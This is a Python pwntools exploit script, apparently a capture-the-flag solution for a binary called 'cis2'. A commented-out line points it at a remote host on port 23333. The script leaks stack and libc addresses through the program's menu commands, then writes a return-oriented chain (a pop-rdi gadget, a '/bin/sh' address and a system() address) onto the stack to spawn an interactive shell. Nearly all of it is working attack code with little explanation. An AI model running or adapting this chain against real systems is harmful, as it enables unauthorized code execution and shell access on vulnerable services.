from pwn import *
from ctypes import *

p=process('./cis2')
# p=remote('106.75.37.31',23333)

pop_rdi_ret=int('0x400ad3',16)

def w(high,value,low):
	# first move down
	for x in range(high):
		p.sendline('w')

	# write into stack[2]
	p.sendline(str(value))
	print 'write value: '+hex(c_uint32(value).value)
	# copy into stack[1]
	p.sendline('m')

	for x in range(low):
		p.sendline('.')
	p.sendline('w')

def main():
	p.recvuntil('Fight!\n\n')

	# begin
	# first get stack addr
	for x in range(33):
		p.sendline('.')
	p.sendline('p')
	p.recvuntil('Value: ')
	addr=p.recvline().strip()
	addr=int(addr,10)

	print 'leak stack addr: '+hex(c_uint32(addr).value)
	stack_addr=addr-420
	dest_addr=stack_addr+65*4
	print 'modify base addr to: '+hex(c_uint32(dest_addr).value)

	for x in range(9):
		p.sendline('w')
	# write into stack[2]
	p.sendline(str(dest_addr))
	# copy into stack[1]
	p.sendline('+')

	for x in range(17):
		p.sendline('.')
	p.sendline('w')

	# now values[index] should point to __libc_start_main's address prefix
	# first leak libc_prefix
	p.sendline('p')
	p.recvuntil('Value: ')
	libc_prefix=p.recvline().strip()
	libc_prefix=int(libc_prefix,10)
	print 'leak libc prefix: '+hex(c_uint32(libc_prefix).value)

	# now leak libc other address
	p.sendline('.')
	p.sendline('p')
	p.recvuntil('Value: ')
	libc_addr=p.recvline().strip()
	libc_addr=int(libc_addr,10)
	print 'leak libc addr: '+hex(c_uint32(libc_addr).value)

	libc_addr=libc_addr-245
	# I used libc-database to search the version of glibc on the remote once but I get nothing.
	# So I failed to get shell from remote.
	sys_addr=libc_addr-0x21a50+0x414f0
	binsh_addr=libc_addr-0x21a50+0x161160

	#################################################################################

	# write pop gadget addr into stack 
	w(17,pop_rdi_ret,19)
	w(17,0,18)

	# write /bin/sh addr to target addr
	w(16,binsh_addr,17)
	w(15,libc_prefix,16)

	# write sys addr to target addr
	w(14,sys_addr,15)
	w(13,libc_prefix,14)

	# gdb.attach(p,'b *0x400987')
	p.sendline('q')
	# get shell
	p.interactive()

main()
